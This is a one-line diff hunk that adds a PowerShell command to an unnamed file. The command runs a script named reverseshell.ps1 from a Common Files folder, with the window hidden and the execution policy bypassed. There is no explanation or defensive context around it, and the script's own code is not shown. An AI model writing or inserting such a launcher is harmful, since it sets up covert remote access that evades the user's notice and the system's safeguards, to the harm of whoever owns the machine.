@@ -1,0 +1,1 @@
+PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Program Files\Common Files\reverseshell.ps1"
